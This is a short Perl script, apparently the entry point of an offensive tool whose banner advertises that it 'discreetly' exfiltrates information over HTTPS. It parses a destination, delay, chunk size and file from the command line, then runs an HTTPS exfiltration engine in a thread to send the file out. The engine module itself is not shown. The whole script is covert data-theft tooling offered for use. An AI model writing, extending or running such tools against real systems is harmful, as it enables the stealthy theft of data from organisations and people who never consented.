#!/usr/bin/perl

use strict;
use threads;
use warnings;

require Entity::Parser;
require Module::HTTPSExfiltration;

print "
             ________  .____   __________
 __ __  ____ \\______ \\ |    |  \\______   \\
|  |  \\/    \\ |    |  \\|    |   |     ___/
|  |  /   |  \\|    `   \\    |___|    |
|____/|___|  /_______  /_______ \\____|
           \\/        \\/        \\/

Discreetly exfiltrate information via the HTTPS protocol.

Fell free to contact the maintainer for any further questions or improvement vectors.
Maintained by Nitrax <nitrax\@lokisec.fr>

";

my $engine;
my $parser = Parser->new();

$parser->parse(@ARGV);

my @factory = (
    { name => 'HTTPS', className => 'HTTPSExfiltration' }
);

for my $method (@factory) {
    if ($method->{name} eq $parser->method) {
        $engine = $method->{className}->new(dest => $parser->dest, delay => $parser->delay, size => $parser->size);

        last;
    }
}

my $thr = threads->create(sub {
    $engine->exfiltrate($parser->file)
});

$thr->join();
